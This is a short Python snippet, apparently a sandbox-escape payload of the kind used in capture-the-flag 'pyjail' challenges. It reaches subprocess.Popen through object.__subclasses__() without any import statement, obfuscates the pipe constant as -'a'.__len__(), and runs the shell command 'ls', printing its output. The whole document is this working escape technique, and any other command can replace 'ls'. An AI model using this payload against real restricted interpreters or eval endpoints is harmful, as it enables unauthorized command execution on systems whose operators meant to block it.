t=().__class__.__base__.__subclasses__()
for x in t:
  if 'Popen' in x.__name__:
    break
w=x("ls",stdout=-"a".__len__())
print(w.communicate())
